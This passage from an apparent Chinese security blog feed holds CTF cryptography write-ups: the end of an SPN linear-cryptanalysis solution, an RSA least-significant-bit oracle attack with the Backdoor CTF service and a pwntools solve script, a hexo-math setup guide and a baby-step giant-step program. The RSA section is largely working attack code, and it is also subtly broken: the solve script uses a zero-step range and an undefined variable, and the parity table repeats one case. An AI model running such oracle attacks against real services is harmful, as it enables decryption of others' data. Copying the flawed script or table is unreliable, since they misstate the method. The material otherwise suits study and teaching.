class="number">91</span>, <span class="number">198</span>, <span class="number">113</span>, <span class="number">156</span>, <span class="number">43</span>, <span class="number">115</span>, <span class="number">68</span>, <span class="number">127</span>, <span class="number">134</span>, <span class="number">94</span>, <span class="number">38</span>, <span class="number">4</span>, <span class="number">186</span>, <span class="number">107</span>, <span class="number">220</span>, <span class="number">23</span>, <span class="number">160</span>, <span class="number">237</span>, <span class="number">207</span>, <span class="number">211</span>, <span class="number">149</span>, <span class="number">77</span>, <span class="number">250</span>, <span class="number">151</span>, <span class="number">210</span>, <span class="number">222</span>, <span class="number">79</span>, <span class="number">22</span>, <span class="number">214</span>, <span class="number">35</span>, <span class="number">25</span>, <span class="number">42</span>, <span class="number">6</span>, <span class="number">223</span>, <span class="number">230</span>, <span class="number">132</span>, <span class="number">65</span>, <span class="number">235</span>, <span class="number">117</span>, <span class="number">209</span>, <span class="number">53</span>, <span class="number">24</span>, <span class="number">169</span>, <span class="number">28</span>, <span class="number">171</span>, <span class="number">69</span>, <span class="number">99</span>, <span class="number">102</span>, <span class="number">184</span>, <span class="number">239</span>, <span class="number">215</span>, <span class="number">130</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">155</span>, <span class="number">44</span>, <span class="number">7</span>, <span class="number">165</span>, <span class="number">174</span>, <span class="number">59</span>, <span class="number">176</span>, <span class="number">118</span>, <span class="number">193</span>, <span class="number">76</span>, <span class="number">123</span>, <span class="number">12</span>, <span class="number">125</span>, <span class="number">63</span>, <span class="number">231</span>, <span class="number">80</span>, <span class="number">37</span>, <span class="number">88</span>, <span class="number">74</span>, <span class="number">122</span>, <span class="number">97</span>, <span class="number">95</span>, <span class="number">49</span>, <span class="number">200</span>, <span class="number">60</span>, <span class="number">144</span>, <span class="number">108</span>, <span class="number">219</span>, <span class="number">197</span>, <span class="number">187</span>, <span class="number">89</span>, <span class="number">17</span>, <span class="number">131</span>, <span class="number">52</span>, <span class="number">236</span>, <span class="number">120</span>, <span class="number">51</span>, <span class="number">18</span>, <span class="number">217</span>, <span class="number">110</span>, <span class="number">67</span>, <span class="number">13</span>, <span class="number">183</span>, <span class="number">136</span>, <span class="number">180</span>, <span class="number">39</span>, <span class="number">255</span>, <span class="number">179</span>, <span class="number">61</span>, <span class="number">181</span>, <span class="number">218</span>, <span class="number">240</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">103</span>, <span class="number">163</span>, <span class="number">27</span>, <span class="number">172</span>, <span class="number">116</span>, <span class="number">212</span>, <span class="number">46</span>, <span class="number">153</span>, <span class="number">129</span>, <span class="number">246</span>, <span class="number">192</span>, <span class="number">243</span>, <span class="number">175</span>, <span class="number">146</span>, <span class="number">105</span>, <span class="number">66</span>, <span class="number">154</span>, <span class="number">248</span>, <span class="number">106</span>, <span class="number">81</span>, <span class="number">137</span>, <span class="number">62</span>, <span class="number">34</span>, <span class="number">226</span>, <span class="number">188</span>, <span class="number">11</span>, <span class="number">126</span>, <span class="number">201</span>, <span class="number">167</span>, <span class="number">166</span>, <span class="number">75</span>, <span class="number">247</span>, <span class="number">36</span>, <span class="number">147</span>, <span class="number">10</span>, <span class="number">251</span>, <span class="number">55</span>, <span class="number">128</span>, <span class="number">253</span>, <span class="number">82</span>, <span class="number">16</span>, <span class="number">138</span>, <span class="number">72</span>, <span class="number">111</span>, <span class="number">92</span>, <span class="number">85</span>, <span class="number">158</span>, <span class="number">90</span>, <span class="number">21</span>, <span class="number">190</span>, <span class="number">254</span>, <span class="number">73</span>, <span class="number">145</span>, <span class="number">101</span>, <span class="number">203</span>, <span class="number">124</span>, <span class="number">164</span>, <span class="number">19</span>, <span class="number">56</span>, <span class="number">70</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">83</span>, <span class="number">228</span>, <span class="number">30</span>, <span class="number">139</span>, <span class="number">64</span>, <span class="number">31</span>, <span class="number">47</span>, <span class="number">152</span>, <span class="number">202</span>, <span class="number">194</span>, <span class="number">26</span>, <span class="number">20</span>, <span class="number">195</span>, <span class="number">196</span>, <span class="number">241</span>, <span class="number">2</span>, <span class="number">225</span>, <span class="number">54</span>, <span class="number">142</span>, <span class="number">57</span>, <span class="number">242</span>, <span class="number">119</span>, <span class="number">157</span>, <span class="number">177</span>, <span class="number">199</span>, <span class="number">112</span>, <span class="number">168</span>, <span class="number">206</span>, <span class="number">227</span>, <span class="number">221</span>, <span class="number">5</span>, <span class="number">178</span>, <span class="number">238</span>, <span class="number">232</span>, <span class="number">48</span>, <span class="number">135</span>, <span class="number">233</span>, <span class="number">96</span>, <span class="number">208</span>, <span class="number">148</span>, <span class="number">121</span>, <span class="number">109</span>, <span class="number">162</span>, <span class="number">161</span>, <span class="number">204</span>, <span class="number">33</span>, <span class="number">205</span>, <span class="number">244</span>, <span class="number">249</span>, <span class="number">78</span>, <span class="number">150</span>, <span class="number">87</span>, <span class="number">234</span>, <span class="number">93</span>, <span class="number">133</span>, <span class="number">50</span>, <span class="number">45</span>, <span class="number">104</span>, <span class="number">189</span>, <span class="number">173</span>, <span class="number">185</span>, <span class="number">86</span>, <span class="number">29</span>, <span class="number">170</span>, <span class="number">71</span>, <span class="number">229</span>, <span class="number">40</span>, <span class="number">159</span>, <span class="number">84</span>, <span class="number">245</span>, <span class="number">252</span>, <span class="number">140</span>, <span class="number">41</span>, <span class="number">58</span>, <span class="number">14</span>, <span class="number">114</span>&#125;;</div><div class="line"><span class="keyword">int</span> cnt[<span class="number">256</span>][<span class="number">256</span>];</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">bit</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> k)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">return</span> (n &amp; (<span class="number">1</span> &lt;&lt; k)) != <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">auto</span> f = fopen(<span class="string">"data"</span>, <span class="string">"rb"</span>);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">65536</span>; i++) &#123;</div><div class="line">        <span class="keyword">uint8_t</span> p[<span class="number">8</span>], c[<span class="number">8</span>];</div><div class="line">        fread(&amp;p, <span class="number">8</span>, <span class="number">1</span>, f);</div><div class="line">        fread(&amp;c, <span class="number">8</span>, <span class="number">1</span>, f);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> a = <span class="number">0</span>; a &lt; <span class="number">256</span>; a++) &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> b = <span class="number">0</span>; b &lt; <span class="number">256</span>; b++) &#123;</div><div class="line">                <span class="keyword">int</span> u4b0 = sbox_inv[(<span class="keyword">int</span>)c[<span class="number">0</span>] ^ a], u4b6 = sbox_inv[(<span class="keyword">int</span>)c[<span class="number">6</span>] ^ b];</div><div class="line">                <span class="keyword">if</span> (bit(p[<span class="number">0</span>], <span class="number">0</span>) ^ bit(p[<span class="number">0</span>], <span class="number">3</span>) ^ bit(p[<span class="number">0</span>], <span class="number">4</span>) ^ bit(u4b0, <span class="number">0</span>) ^ bit(u4b0, <span class="number">4</span>)</div><div class="line">                  ^ bit(u4b6, <span class="number">0</span>) ^ bit(u4b6, <span class="number">4</span>)) &#123;</div><div class="line">                    cnt[a][b]++;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> a = <span class="number">0</span>; a &lt; <span class="number">256</span>; a++) &#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> b = <span class="number">0</span>; b &lt; <span class="number">256</span>; b++) &#123;</div><div class="line">            <span class="keyword">int</span> bias = <span class="built_in">abs</span>(cnt[a][b] - <span class="number">32768</span>);</div><div class="line">            <span class="keyword">if</span> (bias &gt; <span class="number">1000</span>)</div><div class="line">                <span class="built_in">cout</span> &lt;&lt; a &lt;&lt; <span class="string">" "</span> &lt;&lt; b &lt;&lt; <span class="string">" "</span> &lt;&lt; bias &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>结果为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">130 103 1068</div><div class="line">130 118 1044</div><div class="line">130 194 2220</div><div class="line">130 196 1111</div><div class="line">130 213 1068</div><div class="line">149 194 1045</div></pre></td></tr></table></figure>
<p>于是我们可以认为最后1轮中，第0字节为130，第6个字节是194。</p>
<p>当然我们可用类似的办法求出另外一些字节：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">def inv(rnd, r5):</div><div class="line">    r4b = bytearray(r5[i]^r5[4+i] for i in xrange(4))</div><div class="line">    r4a = bytearray(r5[i]^sbox[r4b[(i+1)%4]] ^ (rcon[rnd] if i == 0 else 0) for i in xrange(4))</div><div class="line">    return r4a + r4b</div><div class="line"></div><div class="line">r5 = bytearray([130, 167, 150, 65, 235, 239, 194, 40])</div><div class="line">r4 = inv(4, r5)</div><div class="line">r3 = inv(3, r4)</div><div class="line">r2 = inv(2, r3)</div><div class="line">r1 = inv(1, r2)</div><div class="line">print &apos;flag&#123;%s&#125;&apos;%(str(r1).encode(&apos;hex&apos;))</div></pre></td></tr></table></figure>
<p>最终的flag为flag{48667ec1a5fb3383}</p>
<h3 id="0x05-引用"><a href="#0x05-引用" class="headerlink" title="0x05 引用"></a>0x05 引用</h3><p><a href="https://www.engr.mun.ca/~howard/PAPERS/ldc_tutorial.pdf" target="_blank" rel="external">https://www.engr.mun.ca/~howard/PAPERS/ldc_tutorial.pdf</a></p>
<p><a href="https://gist.github.com/ngg/f534e51c14a832d69c41289837078773" target="_blank" rel="external">https://gist.github.com/ngg/f534e51c14a832d69c41289837078773</a></p>
]]></content>
      
        <categories>
            
            <category> crypto </category>
            
        </categories>
        
        
        <tags>
            
            <tag> spn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[RSA Least-Significant-Bit Oracle Attack]]></title>
      <url>/2018/03/27/RSA-Least-Significant-Bit-Oracle-Attack/</url>
      <content type="html"><![CDATA[<p>此攻击方式是从<a href="https://crypto.stackexchange.com/questions/11053/rsa-least-significant-bit-oracle-attack" target="_blank" rel="external">rsa-least-significant-bit-oracle-attack</a> 看到的，刚好用于Backdoor CTF的一道密码学的题目！</p>
<h3 id="0x1-问题描述"><a href="#0x1-问题描述" class="headerlink" title="0x1 问题描述"></a>0x1 问题描述</h3><p>假如用户知道公钥中$N,e,c$，并且可以任意构造密文$c_1$，返回此密文解密后$p_1$的末尾某些比特位的性质（记为函数$f$），求原始明文信息！</p>
<p>最简单的函数$f$ 是表示 $p_1$ 的奇偶性。</p>
<h3 id="0x2-原理"><a href="#0x2-原理" class="headerlink" title="0x2 原理"></a>0x2 原理</h3><p>攻击者得到密文$C=P^e(mod\ n)$ ，将其乘以$2^e(mod\ N)$, 并作为密文发送出去，若返回$f(2P)$</p>
<blockquote>
<p>如果$f(2P)$ 返回的最后一位是0，那么$2P&lt;N$，即$P&lt;N/2$</p>
<p>如果$f(2P)$ 返回的最后一位是1，那么$2P&gt;N$，即 $P&gt;N/2$</p>
</blockquote>
<p>接着我们来看看$2P$ 和 $4P$</p>
<blockquote>
<p>如果返回的是（偶，偶），那么有 $P&lt;N/4$</p>
<p>如果返回的是（偶，奇），那么有$N/4&lt;P&lt;N/2$</p>
<p>如果返回的是（偶，奇），那么有$N/2&lt;P&lt;3N/4$</p>
<p>如果返回的是（奇，奇），那么有$3N/4&lt;P&lt;N$</p>
</blockquote>
<p>从这里基本上就可以找到规律了，如果我们循环下去，基本上就可以得到P所处在的空间。当次数不断叠加，最终所处在的空间将会十分的小，于是就可以解出对应的解！</p>
<h3 id="0x3-方法"><a href="#0x3-方法" class="headerlink" title="0x3 方法"></a>0x3 方法</h3><p>$P\in[0,P]$ 也即$LB=0$， $UB=N$</p>
<p>使用$log_2\ N$ 次可以根据密文$C$ 求解出明文$P$</p>
<p>$C&#39;=(2^e\ mod\ N)*C$</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">if (Oracle(C&apos;) == even)</div><div class="line">    UB = (UB + LB)/2;</div><div class="line">else</div><div class="line">    LB = (UB + LB)/2;</div></pre></td></tr></table></figure>
<h3 id="0x4-实例"><a href="#0x4-实例" class="headerlink" title="0x4 实例"></a>0x4 实例</h3><p>Backdoor CTF 2018 题目 BIT-LEAKER</p>
<p>service.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python -u</span></div><div class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</div><div class="line"><span class="keyword">import</span> random</div><div class="line"><span class="comment">#from SECRET import flag</span></div><div class="line">flag = <span class="string">"CTF&#123;this_is_my_test_flag&#125;"</span></div><div class="line">m = bytes_to_long(flag)</div><div class="line"></div><div class="line">key = RSA.generate(<span class="number">1024</span>)</div><div class="line"></div><div class="line">c = pow(m, key.e, key.n)</div><div class="line">print(<span class="string">"Welcome to BACKDOORCTF17\n"</span>)</div><div class="line">print(<span class="string">"PublicKey:\n"</span>)</div><div class="line">print(<span class="string">"N = "</span> + str(key.n) + <span class="string">"\n"</span>)</div><div class="line">print(<span class="string">"e = "</span> + str(key.e) + <span class="string">"\n"</span>)</div><div class="line">print(<span class="string">"c = "</span> + str(c) + <span class="string">"\n"</span>)</div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        temp_c = int(raw_input(<span class="string">"temp_c = "</span>))</div><div class="line">        temp_m = pow(temp_c, key.d, key.n)</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">break</span></div><div class="line">    l = str(((temp_m&amp;<span class="number">5</span>) * random.randint(<span class="number">1</span>,<span class="number">10000</span>))%(<span class="number">2</span>*(random.randint(<span class="number">1</span>,<span class="number">10000</span>))))</div><div class="line">    <span class="keyword">print</span> <span class="string">"l = "</span>+l</div></pre></td></tr></table></figure>
<p>solve.py</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div></pre></td><td class="code"><pre><div class="line"># -*- coding: utf-8 -*-</div><div class="line">#/usr/bin/env python</div><div class="line"></div><div class="line">from pwn import *</div><div class="line">import libnum</div><div class="line">import Crypto</div><div class="line">import re</div><div class="line">from binascii import hexlify,unhexlify</div><div class="line"></div><div class="line">if len(sys.argv)&gt;1:</div><div class="line">    p=remote(&quot;127.0.0.1&quot;,2334)</div><div class="line">else:</div><div class="line">    p=remote(&apos;127.0.0.1&apos;,2333)</div><div class="line"></div><div class="line">#context.log_level = &apos;debug&apos;</div><div class="line"></div><div class="line">def oracle(c):</div><div class="line">    l = []</div><div class="line">    for i in range(20):</div><div class="line">        p.sendline(str(c))</div><div class="line">        s = p.recvuntil(&quot;temp_c&quot;)</div><div class="line">        l.append(int(re.findall(&quot;l\s*=\s*([0-9]*)&quot;,s)[0]))</div><div class="line">    flag0 = 0</div><div class="line">    flag2 = 0</div><div class="line">    for i in range(20):</div><div class="line">        if l[i]%2 != 0:</div><div class="line">            flag0 = 1</div><div class="line">        if l[i] &gt; 10000:</div><div class="line">            flag2 = 1</div><div class="line">    return [flag2,flag0]</div><div class="line"></div><div class="line"></div><div class="line">def main():</div><div class="line">    ss = p.recvuntil(&quot;temp_c&quot;)</div><div class="line">    N = int(re.findall(&quot;N\s*=\s*(\d+)&quot;,ss)[0])</div><div class="line">    e = int(re.findall(&quot;e\s*=\s*(\d+)&quot;,ss)[0])</div><div class="line">    c = int(re.findall(&quot;c\s*=\s*(\d+)&quot;,ss)[0])</div><div class="line">    size = libnum.len_in_bits(N)</div><div class="line">    print &quot;N=&quot;,N</div><div class="line">    print &quot;e=&quot;,e</div><div class="line">    print &quot;c=&quot;,c</div><div class="line">    c = (pow(2,e,N)*c)%N</div><div class="line">    LB = 0</div><div class="line">    UB = N</div><div class="line">    i = 1</div><div class="line">    while LB!=UB:</div><div class="line">        flag = oracle(c)</div><div class="line">        print i,flag</div><div class="line">        if flag[1]%2==0:</div><div class="line">            UB = (LB+UB)/2</div><div class="line">        else:</div><div class="line">            LB = (LB+UB)/2</div><div class="line">        c = (pow(2,e,N)*c)%N</div><div class="line">        i += 1</div><div class="line">    print LB</div><div class="line">    print UB</div><div class="line">    for i in range(-128,128,0):</div><div class="line">        LB += i</div><div class="line">        if pow(LB,e,N)==C:</div><div class="line">            print unhexlify(hex(LB)[2:-1])</div><div class="line">            exit(0)</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    main()</div><div class="line">    p.interactive()</div></pre></td></tr></table></figure>
<p>这道题有个问题，就是远程比较慢，所以可能需要很长时间！</p>
<p>另外就是算法的正确度不能保证，所以可能需要中途断开，多跑几次！</p>
<p>还有就是这个算法因为都是整除运算，导致的最终结果可能有一定误差！</p>
]]></content>
      
        <categories>
            
            <category> crypto </category>
            
        </categories>
        
        
        <tags>
            
            <tag> rsa </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[hexo使用hexo-math插件支持MathJax]]></title>
      <url>/2018/03/27/hexo%E4%BD%BF%E7%94%A8hexo-math%E6%8F%92%E4%BB%B6%E6%94%AF%E6%8C%81MathJax/</url>
      <content type="html"><![CDATA[<p>MathJax是使用LaTeX方式输入数学公式的好工具。Hexo虽然可以直接使用mathjax，但是存在一些不方便之处。使用<a href="https://github.com/akfish/hexo-math" target="_blank" rel="external">hexo-math</a>这个插件可以大大方便使用。<br>使用Hexo 3.2.0，主题NexT 5.0.1，hexo-math 3.0.0安装方式如下</p>
<p>在hexo安装目录下执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install hexo-math --save</div></pre></td></tr></table></figure>
<p>然后编辑站点根目录下的<code>_config.yml</code>，添加</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">math:</div><div class="line">  engine: &apos;mathjax&apos; # or &apos;katex&apos;</div><div class="line">  mathjax:</div><div class="line">    src: custom_mathjax_source</div><div class="line">    config:</div><div class="line">      # MathJax config</div></pre></td></tr></table></figure>
<p>之后进入theme的目录，编辑主题的<code>_config.yml</code>，找到mathjax字段。NexT 5.0.1中默认mathjax是禁用，需要改成</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mathjax:</div><div class="line">   enable: true</div></pre></td></tr></table></figure>
<p>最后<code>hexo g</code>，就可以部署或者运行server查看效果了。</p>
<hr>
<p>几个测试例子<br>使用<code>$</code>的一行代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Simple inline $a = b + c$.</div></pre></td></tr></table></figure>
<p>Simple inline $a=b+c$.</p>
<p>使用<code>$$</code>的多行代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$$\frac&#123;\partial u&#125;&#123;\partial t&#125;</div><div class="line">= h^2 \left( \frac&#123;\partial^2 u&#125;&#123;\partial x^2&#125; +</div><div class="line">\frac&#123;\partial^2 u&#125;&#123;\partial y^2&#125; +</div><div class="line">\frac&#123;\partial^2 u&#125;&#123;\partial z^2&#125;\right)$$</div></pre></td></tr></table></figure>
<p>$$\frac{\partial u}{\partial t}= h^2 \left( \frac{\partial^2 u}{\partial x^2} +\frac{\partial^2 u}{\partial y^2} +\frac{\partial^2 u}{\partial z^2}\right)$$</p>
<p>使用Tag的块貌似不能用！！！</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">这儿讲了一些细节：首先是不能直接用\\来当换行符，需要用\newline</div><div class="line">另外编辑公式的时候，不要使用* &#123;% math %&#125; 双大括号 等容易发生冲突的符号</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$$</div><div class="line">\left[</div><div class="line">    \begin&#123;array&#125;&#123;cc|c&#125;</div><div class="line">      1&amp;2&amp;3\newline</div><div class="line">      4&amp;5&amp;6</div><div class="line">    \end&#123;array&#125;</div><div class="line">\right] </div><div class="line">$$</div></pre></td></tr></table></figure>
<p>$$<br>\left[<br>    \begin{array}{cc|c}<br>      1&amp;2&amp;3\newline<br>      4&amp;5&amp;6<br>    \end{array}<br>\right]<br>$$</p>
]]></content>
      
        <categories>
            
            <category> Hexo搭建博客网站 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> hexo </tag>
            
            <tag> math </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[常用于密码学中的算法]]></title>
      <url>/2018/03/26/%E5%B8%B8%E7%94%A8%E4%BA%8E%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%AD%E7%9A%84%E7%AE%97%E6%B3%95/</url>
      <content type="html"><![CDATA[<h3 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h3><p>最近做了不少密码学的题目，对于常见的RSA密钥攻击已经非常熟悉，但是对于比较特殊的密码学攻击手段，我却不甚清楚。下面主要讲解的是几种常见的算法。</p>
<h3 id="0x1-baby-step-giant-step算法"><a href="#0x1-baby-step-giant-step算法" class="headerlink" title="0x1 baby step giant step算法"></a>0x1 baby step giant step算法</h3><p>baby step giant step算法常用于ACM竞赛中，该算法的目的是让$a^x=b(mod\ p)$ 求解的速度更快，核心是利用hash表查询的速度较普通查询方式快，当然同样是用空间换时间的一种思想。大概的时间复杂度$O(\sqrt{p}\ )$</p>
<p>设$m=\lceil\sqrt{p}\ \rceil$</p>
<p>那么可以设$x=i*m-j$</p>
<p>所以原式等价于 $a^{i*m-j}=b(mod\ p) $</p>
<p>也即 $(a^{m})^i=b*a^j$</p>
<p>枚举$j$ (从0-m)，将$b*a^j$ 存入hash表中</p>
<p>枚举i(范围1-m)，从hash表中寻找第一个满足$(a^{m})^i=b*a^j$ 的解</p>
<p>此时$x=i*m-j$</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"></div><div class="line"><span class="built_in">map</span>&lt;ll,<span class="keyword">int</span>&gt;mp;</div><div class="line">ll p,a,b;</div><div class="line">ll n,m,now,ans,t;</div><div class="line"><span class="keyword">bool</span> flag;</div><div class="line"></div><div class="line"><span class="function">ll <span class="title">fast_pow</span><span class="params">(ll x)</span></span></div><div class="line">&#123;</div><div class="line">    ll sum = <span class="number">1</span>;</div><div class="line">    ll aa = a;</div><div class="line">    <span class="keyword">while</span> (x&gt;<span class="number">0</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (x&amp;<span class="number">1</span>) </div><div class="line">            sum = (sum*aa)%p;</div><div class="line">        x = x&gt;&gt;<span class="number">1</span>;</div><div class="line">        aa = (aa*aa)%p;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> sum;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%lld%lld%lld"</span>,&amp;p,&amp;a,&amp;b)!=EOF)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span>(a%p==<span class="number">0</span>)</div><div class="line">        &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"no solution\n"</span>);</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line">        mp.clear();</div><div class="line">        m = <span class="built_in">ceil</span>(<span class="built_in">sqrt</span>(p));</div><div class="line">        flag = <span class="literal">false</span> ;</div><div class="line">        now = b%p;        <span class="comment">//b*a^j 当j==0时 </span></div><div class="line">        mp[now] = <span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;++i)</div><div class="line">        &#123;</div><div class="line">            now = (now*a)%p;</div><div class="line">            mp[now] = i;</div><div class="line">        &#125;</div><div class="line">        t = fast_pow(m);</div><div class="line">        now = <span class="number">1</span>;</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;++i)    <span class="comment">//枚举 (a^m)^i</span></div><div class="line">        &#123;</div><div class="line">            now = (now*t)%p;</div><div class="line">            <span class="keyword">if</span>(mp[now])</div><div class="line">            &#123;</div><div class="line">                flag = <span class="literal">true</span>;</div><div class="line">                ans = i*m-mp[now];</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"%lld\n"</span>,(ans%p+p)%p);    <span class="comment">//printf("%lld\n",(ans%p+p)%p);</span></div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span>(!flag) <span class="built_in">printf</span>(<span class="string">"no solution\n"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
